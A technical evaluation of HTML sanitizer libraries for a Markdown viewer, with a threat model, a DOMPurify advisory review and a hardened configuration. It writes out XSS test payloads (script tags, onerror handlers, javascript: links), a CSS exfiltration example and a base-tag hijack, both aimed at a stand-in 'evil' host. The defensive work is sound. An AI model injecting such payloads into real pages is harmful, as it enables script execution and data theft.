# 05 — HTML sanitizers

**A Markdown viewer parses untrusted files by definition.** A `.md` file
downloaded from the internet, cloned in a repo, or emailed to us contains
whatever its author put in it. If we render it without a sanitizer, we have
built an XSS gadget with a file-open gesture.

This is the highest-weight criterion in
[README.md](README.md#the-evaluation-criteria) (15%) and the one where the
2026 news is worst. **DOMPurify — the de-facto standard — has 33 advisories
in the GitHub Advisory Database and 24 of them affect version 3.2.0.** The
cluster is concentrated in 2026 and concentrated in specific features. Read
§2 before choosing it.

Verified 2026-10-06. Versions from `registry.npmjs.org`; advisory data from
the GitHub Advisory Database (HTML) and OSV (`api.osv.dev/v1/query`), both
fetched; sizes from Bundlephobia; all DOMPurify behaviours from our own runs
against **jsdom 30** with DOMPurify **3.4.16**.

---

## 0. Comparison

| | DOMPurify 3.4.16 | sanitize-html 2.18.0 | hast-util-sanitize 5.0.2 | insane 2.6.2 | ammonia 4.2.1 |
|---|---|---|---|---|---|
| Environment | **browser/DOM** (jsdom for Node) | **Node only** | any (pure data) | browser + Node | **Rust** |
| Version published | **2026-09-23** | **2026-09-30** | 2024-10-25 | **2016-09-19** | **2026-10-03** |
| Licence | **MPL-2.0 OR Apache-2.0** | MIT | MIT | MIT | MIT OR Apache-2.0 |
| Min | 28,288 B | 136,495 B | 7,988 B | — | n/a |
| Min + gzip | **11,137 B** | 50,448 B | **3,298 B** | — | n/a |
| Runtime deps | **0** | 7 (htmlparser2 etc.) | 3 | 2 (`assignment`, `he@0.5`) | html5ever |
| Default model | allowlist with **hooks** + profiles | allowlist + URL schemes | **GitHub-style allowlist** | allowlist | **strict allowlist** |
| Default tags | ~250 (HTML + SVG + MathML) | 17 | **53** | ~50 | ~100 |
| URL scheme filtering | yes, via `ALLOWED_URI_REGEXP` + `IS_ALLOWED_URI` | yes, `allowedSchemes` | yes, per-protocol | partial | yes |
| Id/name clobbering defence | `SANITIZE_DOM` (default true) | yes (`id` prefixing) | **yes** — `clobber` + `clobberPrefix` | no | yes |
| Returns | string / `Node` / `TrustedHTML` | string | hast tree | string | string |
| TS types | **first-party** | **none** (`@types/sanitize-html` community) | first-party | **none** | n/a |
| Node engine | none | Node 10+ | Node 16+, **ESM only** | none | Rust 1.85 |
| GHSA advisories (`affects:`) | **33** | 0 reported | 0 reported | — | — |
| Stars | 17,441 | 4,112 | 60 | 483 | 679 |
| Monthly downloads | **274,122,222** | 45,555,651 | n/a (part of 2.6M remark) | — | n/a |
| Last commit | **2026-10-05** | 2026-02-26 | 2025-09-24 (repo) | **2018-04-24** | **2026-10-03** |
| Repo status | active, has OpenSSF Best Practices badge | **repo retired → monorepo** | active | **dead** | active |

**The four properties that decide it for a desktop viewer:**

1. Does it run where we need it? DOMPurify needs a DOM. In a Tauri webview we
   have one. In a Node CLI/SSR path we need jsdom. In Rust we need ammonia.
2. Does it parse HTML the way the *browser* will? This is the mXSS question.
   DOMPurify uses the browser's own parser, so by construction yes. ammonia
   uses html5ever, which is Spec-compliant, so also yes. A regex/string-based
   sanitizer, no.
3. Is the advisory history survivable? DOMPurify's is long. We manage it with
   automation, not by avoiding the library.
4. Does it defend DOM clobbering? A `viewer` that sets `<form>`/`<img
   name=x>` can shadow globals the page's own script relies on. Every one of
   these except `insane` handles it.

---

## 1. Threat model: what are we actually defending against?

Writing this down first, because "sanitize the HTML" is too vague to
evaluate a library against.

| # | Attack | Where it comes from | Defence |
|---|---|---|---|
| 1 | `<script>` in a fenced or raw HTML block | document body | parser escapes it (markdown-it `html:false`); sanitizer is layer 2 |
| 2 | `on*` event handler attributes | raw HTML | sanitizer strips non-allowlisted attributes |
| 3 | `javascript:` / `vbscript:` / `data:` URLs | `[click](javascript:…)`, raw `<a href>` | markdown-it's `validateLink`; sanitizer's URL filtering is layer 2 |
| 4 | `<iframe src="javascript:">`, `<object data=>`, `<embed>` | raw HTML | tag allowlist removes them entirely |
| 5 | **mXSS** — markup that is inert in the sanitizer's parse but live after browser re-parse | mutation, `<noscript>`, `<template>`, `<style>` text | only a browser-accurate parser (DOMPurify, ammonia) defends this |
| 6 | DOM clobbering via `id`/`name` | `<img name="body">` | `SANITIZE_DOM` / `clobber` |
| 7 | CSS-based exfiltration | `style="background:url(//evil/?leak)"` | attribute allowlist; no `style` unless we add it |
| 8 | Meta refresh | `<meta http-equiv=refresh>` | tag allowlist |
| 9 | SVG/MathML script vectors | `<svg><script>` | DOMPurify sanitises SVG and MathML; we must decide whether to *allow* them at all |
| 10 | Base-tag hijack | `<base href="//evil/">` rewrites every relative URL | tag allowlist |
| 11 | **Protocol-relative URLs** `//evil/x.png` | any link | *bypasses scheme allowlists entirely* — must be handled by a separate rule |
| 12 | Front-matter-driven behaviour | `--- \n redirect: //evil ---` | we parse front matter as **data**, never as directives |

Attack 11 is worth dwelling on: `//evil.example/x.png` has no scheme, so it
passes every scheme allowlist in every library on this page, and it silently
loads from a different origin. Any sanitizer policy we write must have an
explicit rule about it.

---

## 2. DOMPurify 3.4.16 — including the 2026 cluster

### 2.1 What it is

> DOMPurify is a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML,
> MathML and SVG.
>
> It's also very simple to use and get started with. DOMPurify was started in
> February 2014 and has meanwhile reached version **v3.4.16**.

Zero runtime dependencies. Dual CJS (`dist/purify.cjs.js`) and ESM
(`dist/purify.es.mjs`). MPL-2.0 OR Apache-2.0 — note this is **not MIT/BSD**;
it is file-level copyleft (MPL) which is fine for linking but is a licence
our project must acknowledge. It carries an OpenSSF Best Practices badge and
its repo was last committed **2026-10-05** — five days ago.

Its structural advantage over every other JS option: **it uses the browser's
own HTML parser via `DOMParser` / `document.implementation.createHTMLDocument`.
** The sanitizer and the browser cannot disagree about what the markup means,
because they are literally the same parser. That is the mXSS defence, and it
is why DOMPurify is 274M monthly downloads and why rehype-sanitize's schema is
modelled on GitHub's.

### 2.2 Verified behaviour

```js
import DOMPurify from 'dompurify'          // browser
// or: const DOMPurify = require('dompurify')(window)  // Node + jsdom

purify.version       // '3.4.16'
purify.isSupported   // true
purify.removed       // [{ element, attribute, from }] — WHAT IT STRIPPED
```

Default sanitisation of
`<p>ok</p><script>alert(1)</script><img src=x onerror=alert(2)><a href="javascript:alert(3)">bad</a>`:

```html
<p>ok</p><img src="x"><a>bad</a>
```

Script gone. `onerror` gone. `href` gone entirely from the `<a>` (the
attribute is removed, not rewritten). `purify.removed.length` reported 2 for
this input — the `<script>` element and the `onerror` attribute (the `href`
removal counts under the element's attribute set).

Custom configuration, which is what we will actually use:

```js
purify.sanitize(html, {
  ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li',
                 'blockquote', 'pre', 'code', 'em', 'strong', 'del', 'a',
                 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr',
                 'br', 'sup', 'sub', 'mark'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'id', 'class',
                 'align', 'colspan', 'rowspan', 'start', 'type', 'checked',
                 'disabled', 'data-footnote-ref', 'data-footnote-backref'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],
  FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed', 'form',
                'input', 'button', 'svg', 'math', 'base', 'meta', 'link'],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel):/i,   // NO //
  RETURN_TRUSTED_TYPE: false,
})
```

Note the deliberate choices, each of which corresponds to a row in §1:

- `ALLOWED_URI_REGEXP` with **no `//`** — kills protocol-relative URLs.
- `ALLOW_DATA_ATTR: false` — data attributes are a hook for CSS-based
  exfiltration and for script-gadget selectors.
- `class` allowed but only with a **fixed** set of class names we emit; see
  below.
- `FORBID_TAGS` includes `svg` and `math`. DOMPurify *can* sanitise them
  competently (it does, by default), but SVG/MathML are the two element
  families with the deepest mXSS history and the lowest payoff for a notes
  app. We disable them. That decision costs us inline SVG diagrams, which is
  an acceptable trade; it is recorded as an open question.
- `RETURN_TRUSTED_TYPE: false` — under a CSP with `require-trusted-types-for
  'script'` we would keep the default, but our app does not yet.

### 2.3 The 2026 advisory cluster — what actually happened

`affects: dompurify` on the GitHub Advisory Database returns **33
advisories**. Grouped:

**Pre-2025 (4):**
- CVE-2024-48910 (Oct 2024) — **Critical** — "DOMPurify vulnerable to
  tampering by prototype pollution". Credited to eslerm.
- CVE-2025-26791 (Feb 2025) — Moderate — XSS.
- CVE-2026-0540 and CVE-2025-15599 (both published Mar 2026, same fix,
  credited to swils23, **cure53**, and caverav) — Moderate — XSS.

**The 2026 cluster (the rest, all in Feb–Oct 2026).** OSV reports **24
advisories affecting `dompurify@3.2.0`** and **4 affecting
`dompurify@3.4.10`**. Reading the titles, the cluster has **three
recognisable families**, and knowing them tells you what *not* to use:

**(a) `IN_PLACE` mode.** Seven advisories, Low to Moderate:
`GHSA-6688-9rhm-gjv2` (Oct 2026, the most recent — affects ≤3.4.15, patched
in 3.4.16), `GHSA-55q2-fjhq-7xh7` (Aug 2026, Moderate), `GHSA-p98j-92pf-mc4p`
(Sep 2026), `CVE-2026-49978`, `CVE-2026-49458`, `CVE-2026-49459`,
`CVE-2026-66010`. We read `GHSA-6688-9rhm-gjv2` in full. Its root cause, in
the reporter's words:

> The 3.4.9 fix for the IN_PLACE detached-root class added two protections on
> the IN_PLACE return path […] Both miss the rawtext text-content form. When
> the force-removed root is a rawtext element (`<style>`), the payload lives in
> the node's text […] the IN_PLACE exit returns the detached, never-sanitized
> `<style>` whose text still carries live markup.

And the applicability caveat:

> The payload materializes when the application **serializes and re-parses**
> the sanitizer output […] Moving the returned node via `appendChild` alone
> does not trigger it. […] Applications that pass live, connected attacker
> trees into `IN_PLACE` are **explicitly warned against by upstream's own
> source comment**.

**(b) Configuration and hook pollution.** Six advisories, Moderate:
`CVE-2026-65898` ("Permanent `ALLOWED_ATTR` pollution via `setConfig()`
bypassing the hook clone-guard (incomplete fix of the 3.4.7 hook-pollution
patch)"), `CVE-2026-65902` ("Hook mutation of `data.allowedTags` /
`data.allowedAttributes` permanently pollutes `DEFAULT_ALLOWED_TAGS` /
`DEFAULT_ALLOWED_ATTR`"), `CVE-2026-65913` ("`USE_PROFILES` prototype pollution
allows event handlers"), `CVE-2026-65914` (mutation-XSS via
Re-Contextualization), `CVE-2026-65903` (`ADD_TAGS` function form bypasses
`FORBID_TAGS` due to short-circuit evaluation), `CVE-2026-41240` (`FORBID_TAGS`
bypassed by function-based `ADD_TAGS` predicate). One was **withdrawn** as a
duplicate (`GHSA-jxrp-r7gx-q4j8`).

**(c) Truncated read of 2026 advisories, continued:** `CVE-2026-65901`,
`CVE-2026-65900`, `CVE-2026-65899`, `CVE-2026-65912` (`ADD_ATTR` predicate
skips URI validation), `CVE-2026-65914` (mutation-XSS via
Re-Contextualization), `CVE-2026-41238` (prototype pollution → XSS bypass via
`CUSTOM_ELEMENT_HANDLING` fallback), `CVE-2026-41239` (`SAFE_FOR_TEMPLATES`
bypass in `RETURN_DOM` mode), `CVE-2026-47423` (**High** — XSS via
`selectedcontent` re-clone), `CVE-2026-41240` (`FORBID_TAGS` bypassed by
function-based `ADD_TAGS` predicate).

### 2.4 What that cluster means for us — concretely

**Every single advisory in the 2026 cluster requires the application to opt
into a non-default feature or to write a custom hook.** The families are:

| Family | Trigger | Do we use it? |
|---|---|---|
| `IN_PLACE` | `sanitize(node, {IN_PLACE: true})` | **No.** We always call `sanitize(string)` and get a string back. Never `IN_PLACE`. |
| hook / config pollution | custom `afterSanitize*` hooks that mutate `data.allowedTags`, or `setConfig()` after hooks are installed | **No.** We pass a plain config object, install zero hooks. |
| `CUSTOM_ELEMENT_HANDLING` | `{CUSTOM_ELEMENT_HANDLING: {...}}` | **No.** We never enable it. |
| `USE_PROFILES` prototype pollution | `{USE_PROFILES: {...}}` | **No.** We use explicit `ALLOWED_TAGS`, not profiles. |
| `SAFE_FOR_TEMPLATES` | `{SAFE_FOR_TEMPLATES: true}` | **No.** We do not generate templates from user content. |
| `selectedcontent` re-clone mXSS | `<selectedcontent>` in input | **No** — we strip all HTML anyway, and it is a `FORBID_TAGS` candidate. |

**So: with a plain config object and no hooks, none of the 24 known
3.2.0-affecting advisories apply to our usage.** That is a real, checkable
result — not a reassurance. It also means:

**We are choosing the boring configuration deliberately, and we must protect
that choice in code review.** A future contributor adding a `afterSanitizeAttributes`
hook "to allow our custom attribute" would re-enter family (b). So:

1. The sanitize call lives in **one module** with a frozen config, no
   parameters, no hooks. Everything else imports it.
2. A lint rule / code-review note forbids passing any of `IN_PLACE`,
   `CUSTOM_ELEMENT_HANDLING`, `USE_PROFILES`, `SAFE_FOR_TEMPLATES`, or any
   `afterSanitize*` hook at that call site.
3. `setConfig()` is never called anywhere in our codebase.
4. CI pins DOMPurify to `>=3.4.16` and runs OSV on every lockfile change.

**The residual risk is real and we will state it plainly.** DOMPurify has
shipped 24 fixes to an allowlist sanitizer in ~9 months. That is not a sign
of a broken project — it is a sign of a project defending a genuinely hard
problem against researchers who keep finding edges. It *does* mean our
sanitizer is a **moving target that we must track**, and that our security
posture includes "we upgrade DOMPurify promptly". This goes in
`SECURITY.md`.

### 2.5 An alternative that has none of this

`hast-util-sanitize` 5.0.2 (published 2024-10-25, 0 advisories in its entire
history, MIT, **3,298 B gzipped**, ESM-only, Node 16+) is a *pure data
transform* over a hast tree. It has no DOM, no hooks, no prototype
inheritance, no `IN_PLACE`, no config mutation. It cannot have the 2026 class
of bug because the class of bug requires a live DOM and mutable
configuration.

```js
import { sanitize, defaultSchema } from 'hast-util-sanitize'
```

Its default schema, which we measured directly from the installed package:

```js
defaultSchema.tagNames.length         // 53
Object.keys(defaultSchema.attributes).length  // 19
defaultSchema.clobber                // ['ariaDescribedBy','ariaLabelledBy','id','name']
defaultSchema.clobberPrefix          // 'user-content-'
```

53 tags. That is **fewer than we need** — no `table`, no `input`, no `mark`,
no `sup`/`sub` in the default set — so we extend it. But extending a
declarative schema is auditable in a way that mutating DOMPurify's internal
state is not.

And `rehype-sanitize` 6.0.0 (2023-08-26) is the unified plugin wrapping it.
We ran it:

```js
const processor = unified()
  .use(remarkParse).use(remarkGfm)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use(rehypeSanitize)
  .use(rehypeStringify)

// input: 'Hi <script>alert(1)</script> there.\n\n<img src=x onerror="alert(2)">\n\n<a href="javascript:alert(3)">bad</a>\n\n~~strike~~'
// output:
// <p>Hi  there.</p>
// <img src="x">
// <p><a>bad</a></p>
// <p><del>strike</del></p>
```

Script element and its text gone. `onerror` gone. `href` gone. GFM strikethrough
preserved.

**And the control.** Same pipeline **without** `rehypeSanitize`:

```html
<p>Hi <script>alert(1)</script> there.</p>
<img src="x" onerror="alert(2)">
<p><a href="javascript:alert(3)">bad</a></p>
<p>Inline <b onmouseover="x()">bold</b> text.</p>
```

Which is precisely the payload. markdown-it with `html: true` produces the
same unsafe output, so `html: true` is not a security posture, it is a
*pre-sanitisation* posture.

**The catch for us:** to use `rehype-sanitize` we must already be in the
unified ecosystem, which per
[01-js-parsers §3.5](01-js-parsers.md#35-the-performance-problem--measured)
costs 10.8× markdown-it's parse time. **Unless we sanitise at the string
level.** And there is a string-level option in the same family worth
knowing: `rehype-raw` + `hast-util-sanitize` needs a hast tree, but
`hast-util-from-html` + `hast-util-sanitize` + `hast-util-to-html` gives the
same guarantee with no Markdown parser involved.

---

## 3. sanitize-html 2.18.0

### 3.1 What it is, and the repo situation

> sanitize-html provides a simple HTML sanitizer with a clear API.
> sanitize-html is tolerant. It is well suited for cleaning up HTML fragments
> such as those created by CKEditor and other rich text editors. It is
> especially handy for removing unwanted CSS when copying and pasting from
> Word.

**Its repository is retired.** The `apostrophecms/sanitize-html` README now
reads, in full:

> # Deprecated — see our [monorepo](https://github.com/apostrophecms/apostrophe/tree/main/packages/sanitize-html)
>
> We have retired this repository in favor of our monorepo.

The code lives on at `packages/sanitize-html` inside the Apostrophe CMS
monorepo, and npm still publishes **2.18.0, released 2026-09-30**. So the
package is alive; the *repo* a contributor would clone is not the one you
want. That is a real onboarding hazard.

It requires **Node 10+** and is built on `htmlparser2`. It has **no official
TypeScript types** — the README says so and points at community
`@types/sanitize-html`. Under `esModuleInterop: false` you must
`import * as sanitizeHtml from 'sanitize-html'`.

### 3.2 Configuration

```js
const sanitizeHtml = require('sanitize-html')

sanitizeHtml(dirty, {
  allowedTags: ['h1','h2','p','a','ul','li','code','pre','table','tr','th','td'],
  allowedAttributes: { a: ['href','title'], img: ['src','alt'] },
  allowedSchemes: ['http','https','mailto'],
  allowedSchemesByTag: { img: ['http','https','data'] },
  allowProtocolRelative: false,          // <-- attack #11, explicitly off
  disallowedTagsMode: 'discard',          // or 'escape' | 'recursiveEscape'
  enforceHtmlBoundary: true,
  transformTags: {
    a: sanitizeHtml.simpleTransform('a', { rel: 'noopener noreferrer' }),
  },
  exclusiveFilter(frame) {                // drop the whole subtree
    return frame.tag === 'iframe' || frame.attribs.src?.startsWith('data:')
  },
})
```

`allowProtocolRelative: false` is a **first-class option**, which is better
than the regexp surgery we would need with DOMPurify. `disallowedTagsMode`
controls the unwrap-vs-drop distinction we discussed for ammonia. And
`exclusiveFilter` lets you drop a subtree rather than unwrap it, which is what
you want for `script`/`style`/`iframe` — the same thing ammonia calls
`clean_content_tags`.

### 3.3 Assessment

**Not usable in our frontend.** It is Node-only by design ("sanitize-html is
intended for use with Node.js"), it is 4.5× the minified size of DOMPurify,
it has 7 runtime dependencies, and it has no first-party types. In a
Tauri/Node world it *would* be the right choice for a headless pipeline — for
example, sanitising HTML in a build step or in a server-side export. In the
webview it is not.

We record the repo retirement as a maintenance signal, not a death notice:
45.5M monthly downloads and a release nine days ago is a maintained package.

---

## 4. @braintree/sanitize-url 7.1.2

A different job: **URL sanitisation only**, no HTML.

```js
import { sanitizeUrl } from '@braintree/sanitize-url'

sanitizeUrl("https://example.com")        // 'https://example.com'
sanitizeUrl("www.example.com")            // 'www.example.com'
sanitizeUrl("mailto:hello@example.com")   // 'mailto:hello@example.com'
sanitizeUrl("javascript:alert(document.domain)")                        // 'about:blank'
sanitizeUrl("jAvasCrIPT:alert(document.domain)")                        // 'about:blank'
sanitizeUrl(decodeURIComponent("JaVaScRiP%0at:alert(document.domain)")) // 'about:blank'
// HTML-entity-encoded javascript:                     -> 'about:blank'
```

Zero runtime dependencies, MIT, released 2026-01-29.

**Its value to us is real but narrow.** markdown-it's `validateLink` blocks
`javascript:`/`vbscript:`/`file:`/`data:` at parse time, which we verified
works. But raw HTML `<a href>` goes through markdown-it's `html_block` /
`html_inline` rules, which are *not* URL-validated. And front matter, wikilink
targets and image paths in `attrs` syntax may not go through `validateLink`
either. **`sanitize-url` is the right tool for the paths that bypass
`validateLink`** — it is 28 KB unpacked, has no history, and returns
`about:blank` rather than throwing, which is exactly the behaviour we want in
a URL-rewriting pass.

Its one weakness: it does not handle protocol-relative URLs (`//evil/x`),
because there is no scheme to inspect. We handle that with our own rule.

---

## 5. insane 2.6.2 — do not use

The brief asks about `insane` as "a smaller alternative". It is smaller. It is
also **dead**:

| Fact | Value |
|---|---|
| Latest release | **2.6.2**, published **2016-09-19** |
| Last repo commit | **2018-04-24** |
| Runtime deps | `assignment@2.0.0`, **`he@0.5.0`** |
| Stars | 483 |
| Description | "Lean and configurable whitelist-oriented HTML sanitizer" |

Ten years without a release. Its dependency `he` is pinned to **0.5.0**, a
version from 2014, which transitively pulls old `regexpu-core`. It has **no
TypeScript types** (npm metadata shows `types` absent). It is still named as a
recommended sanitizer in marked's documentation, which is a documentation bug
that has outlived the library.

We list it here so that a reader who finds it in a 2018 Stack Overflow answer
can stop reading.

---

## 6. ammonia 4.2.1 — the Rust option

Covered with API detail in
[02-rust-parsers §8](02-rust-parsers.md#8-sanitisation-in-rust-ammonia).
The relevant facts for sanitiser selection:

- **Version 4.2.1, published 2026-10-03.** Licence MIT OR Apache-2.0. MSRV
  1.85. 679 stars. 17.7M total downloads, 5.1M in 90 days. Last commit
  2026-10-03 — **actively maintained**.
- **Uses html5ever**, Servo's HTML5 parser. Its README states the reason:
  > it is extremely resilient to syntactic obfuscation.

  html5ever implements the HTML5 parsing spec. DOMPurify uses the browser's
  parser, which also implements the HTML5 parsing spec. **These two are the
  only options on this page that cannot disagree with the browser about what
  a string means.** Everything else — regex sanitizers, string-level
  allowlisters — can, and that is where mXSS lives.
- Whitelist-only, with a `Builder` where every knob is explicit:
  `tags()`, `generic_attributes()`, `url_schemes()`, `link_rel()`,
  `clean_content_tags()`.
- Published performance: ~87.5 µs to clean the Ammonia docs' intro, versus
  ~1.50 ms for `bleach` 2.0.0 + `html5lib` on the same input — its own
  benchmark, cross-language, ~17×. **We found no credible published
  DOMPurify-vs-ammonia benchmark**, so we cannot put a number on the JS side.

**If we ship Tauri, ammonia should sanitise in Rust before the HTML crosses
the IPC boundary**, with DOMPurify in the webview as layer 2. That is
belt-and-braces on the one boundary we do not control, and it costs
essentially nothing — the Rust side already has the HTML string.

---

## 7. Performance

**We did not measure sanitizer throughput.** We deliberately did not fabricate
a table. What we can report honestly:

| Claim | Source | Trust |
|---|---|---|
| Ammonia ~87.5 µs for its docs intro; bleach 2.0.0 + html5lib ~1.50 ms for the same input | ammonia's own README, with the command used | Author-run, cross-language, small input, different parser generations. **Ratio is suggestive; neither number transfers to our workload.** |
| DOMPurify is "super-fast" | its README | **Marketing copy. Not a measurement. Not usable as evidence.** |
| "DOMPurify is ~2–4× faster than sanitize-html" | **no credible published benchmark found** | — |
| DOMPurify vs hast-util-sanitize | **no credible published benchmark found** | — |

**How we would measure it**, since this is a real gap and a real
decision-relevant number:

```js
// packages/test-fixtures/bench/sanitize.mjs  — methodology, not results
import { tinybench } from 'tinybench'          // 6.2.0, 2026-09-09

const corpus = loadCorpus()                     // the 15-file real corpus
const html = corpus.flatMap(md => [markdownIt.render(md), /* adversarial cases */])

// Adversarial cases matter more than real documents here. Include:
//   mutation-XSS payloads (the DOMPurify test corpus is public)
//   nested <math>/<svg>/<noscript>
//   10k-deeply-nested markup (parser stack limits)
//   a 5 MB single <pre> (serialiser behaviour)
const b = new tinybench({ time: 2000 })
b.add('DOMPurify', () => purify.sanitize(html.join(''), OUR_CONFIG))
b.add('hast path', () => sanitizeTree(parseHtml(html.join(''))))
await b.run()
// report ops/sec and mean p99, plus peak heap
```

Then run it **inside the actual Tauri webview** with
`performance.measureUserAgentSpecificMemory()` available, because DOMPurify
in jsdom and DOMPurify in WebView2 are different code paths (jsdom's HTML
parser is `parse5`, not Blink's). This is recorded in
[15-open-questions](../15-open-questions/).

---

## 8. The known-bypass caveat — stated properly

Every sanitizer on this page has had a bypass. The honest framing has three
parts.

**1. Sanitizers are not security boundaries; *architectures* are.** The
industry consensus, which we adopt:

> No amount of sanitising makes "render untrusted HTML in your page" safe.
> The safe architecture is: do not render untrusted HTML.

Our architecture, in order of layers:

```
1. Parser does not emit raw HTML at all
   (markdown-it html:false — the default, and we keep it)
2. Every URL that reaches an href/src passes through an allowlist
   (validateLink at parse time + sanitize-url for the paths that bypass it)
3. Whatever HTML reaches the DOM is passed through a sanitizer
   (DOMPurify, frozen config, no hooks)
4. Our CSS is written so that sanitised content cannot escape its container
   (no inherited layout escape, no :has() gadget selectors on user content)
5. We never evaluate user content as code, ever
   (no shortcodes, no file includes — see 03-other-ecosystems §7)
```

**2. Allowlist sanitizers fail *open* when misconfigured, not closed.** Every
2026 DOMPurify advisory was a *configuration* interaction, not a
default-config bypass. That is good news (the defaults hold) and bad news
(anything custom is where we die). Hence the frozen-config module and the
code-review rule.

**3. The residual is not zero and we will not pretend otherwise.** A viewer
that renders untrusted Markdown will, at some version of some browser, have a
sanitizer bypass. Our mitigation is not "we found the perfect sanitizer" —
it is:

- CSP as a second line (`script-src 'self'`; no `unsafe-inline`),
- no inline event handlers anywhere in our own code,
- `sandbox` on the preview `<iframe>` if we use one (we should, for raw-HTML
  documents),
- an automatic updater for DOMPurify, and an OSV gate in CI,
- a **documented, user-visible trust model**: our renderer runs with
  `html: false` by default and *cannot be configured* to emit raw HTML. If we
  ever ship a "trust this file / allow HTML" toggle, it must be behind an
  explicit per-file, per-session consent with a visible indicator.

**4. SVG and MathML are a decision, not a default.** DOMPurify sanitises both
competently. We choose to forbid them (§2.2) because they are the deepest
mXSS history and the lowest payoff for a notes app. This is reversible and is
recorded as an open question, not a permanent stance.

---

## 9. Recommendation

**DOMPurify ≥3.4.16 as the single sanitiser in the frontend, behind a frozen
config in one module. ammonia in Rust as layer 2 if we ship Tauri.
hast-util-sanitize on the AST path if we ever adopt unified. Drop insane.
Do not use sanitize-html in the webview.**

Concrete policy:

1. `packages/core/src/sanitize/index.ts` exports exactly one function,
   `sanitizeHtml(dirty: string): string`. No options parameter. No hooks.
   Config is a frozen module constant, version-controlled and reviewable.
2. That config uses explicit `ALLOWED_TAGS` / `ALLOWED_ATTR` (not
   `USE_PROFILES`), `ALLOW_DATA_ATTR: false`,
   `ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel):/i` (no `//`),
   `FORBID_TAGS` including `svg`, `math`, `style`, `script`, `iframe`,
   `object`, `embed`, `form`, `input`, `base`, `meta`, `link`.
3. A documented prohibition on `IN_PLACE`, `CUSTOM_ELEMENT_HANDLING`,
   `USE_PROFILES`, `SAFE_FOR_TEMPLATES`, `setConfig()` and `afterSanitize*`
   hooks, **with the reason** (the 2026 advisory cluster) written next to it,
   because "because a vulnerability" beats "because the code review said so".
4. `sanitizeUrl` from `@braintree/sanitize-url` for every URL not produced by
   markdown-it's own link rule, plus an explicit protocol-relative rejection
   rule.
5. CI: pin `dompurify >=3.4.16`, run OSV on the lockfile, fail the build on
   any new advisory for any package in the sanitisation path.
6. A CSP with no `unsafe-inline`, from day one, so that a future sanitizer
   bug degrades to "does nothing" instead of "runs attacker script".
7. `SECURITY.md` states the trust model explicitly: untrusted files are
   rendered with raw HTML disabled and always sanitised; there is no mode in
   which that is not true.
